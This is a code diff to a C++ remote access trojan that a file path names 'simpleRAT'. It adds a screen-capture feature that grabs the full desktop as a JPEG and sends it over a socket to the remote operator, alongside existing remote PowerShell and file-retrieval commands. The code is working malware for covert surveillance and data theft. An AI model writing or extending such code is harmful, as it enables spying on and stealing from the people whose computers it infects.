@@ -3,7 +3,6 @@
 
 
 #include "Header.h"
-
 enum CmdStatus
 {
     SUCCESSFUL = 0,
@@ -13,7 +12,6 @@ enum CmdStatus
 
 };
 
-int keepRunning = 1;
 HANDLE newStdIn, writeStdIn;
 HANDLE newStdOut, readStdOut;
 PROCESS_INFORMATION powershell;
@@ -208,6 +206,93 @@ int getFileContent(SOCKET s, char* filename)
 
 }
 
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT  num = 0;
+    UINT  size = 0;
+
+    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
+
+    Gdiplus::GetImageEncodersSize(&num, &size);
+    if (size == 0)
+        return -1;
+
+    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL)
+        return -1;
+
+    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j)
+    {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
+        {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return 0;
+}
+
+int captureScreen(SOCKET s)
+{
+    //Reference: https://gist.github.com/prashanthrajagopal/05f8ad157ece964d8c4d
+    //Reference: https://stackoverflow.com/questions/3291167/how-can-i-take-a-screenshot-in-a-windows-application
+    //Reference: https://stackoverflow.com/questions/36544155/converting-a-screenshot-bitmap-to-jpeg-in-memory/36545132
+
+    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    IStream* istream = NULL;
+    HRESULT res = CreateStreamOnHGlobal(NULL, true, &istream);
+    //put this inside a block so the destructors will be called before GdiplusShutdown
+    //take the screenshot and put it into a stream
+    {
+        HDC dcScreen = GetDC(NULL);
+        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+        HBITMAP screenBmp = CreateCompatibleBitmap(dcScreen, width, height);
+
+        HDC destDc = CreateCompatibleDC(dcScreen);
+        HBITMAP hOldBitmap = (HBITMAP)SelectObject(destDc, screenBmp);
+        BitBlt(destDc, 0, 0, width, height, dcScreen, 0, 0, SRCCOPY);
+
+        Gdiplus::Bitmap image(screenBmp, 0);
+        CLSID encoder;
+        GetEncoderClsid(L"image/jpeg", &encoder);
+        //Gdiplus::Status status = image.Save(L"D:\\simpleRAT\\simpleRAT\\test.jpeg", &encoder);
+        Gdiplus::Status status = image.Save(istream, &encoder);
+
+        DeleteObject(destDc);
+        DeleteObject(destDc);
+        ReleaseDC(0, dcScreen);
+        
+    }
+    Gdiplus::GdiplusShutdown(gdiplusToken);
+
+    ULARGE_INTEGER liSize;
+    IStream_Reset(istream);
+    IStream_Size(istream, &liSize);
+    DWORD len = liSize.LowPart;
+    char *imageBuf = new char[len];
+    int status = IStream_Read(istream, imageBuf, len);
+    send(s, (char*)(&status), 4, 0);
+    if (status == S_OK)
+    {
+        send(s, "\x00\x00\x00\x00", 4, 0);
+        send(s, imageBuf, len, 0);
+    }
+    else
+    {
+        istream->Release();
+        delete[] imageBuf;
+        return CLIENT_ERROR;
+    }
+    istream->Release();
+    delete[] imageBuf;
+    return SUCCESSFUL;
+}
+
 void cleanUp()
 {
     CloseHandle(newStdIn);
@@ -253,7 +338,7 @@ int main()
         printf("Handshake failed");
         exit(HANDSHAKE_ERROR);
     }
-
+    int keepRunning = 1;
     while (keepRunning)
     {
         char command[256];
@@ -278,6 +363,9 @@ int main()
             status = getFileContent(s, command + 4);
             break;
 
+        case 4:
+            status = captureScreen(s);
+            break;
         default:
             puts("Invalid command id");
             break;
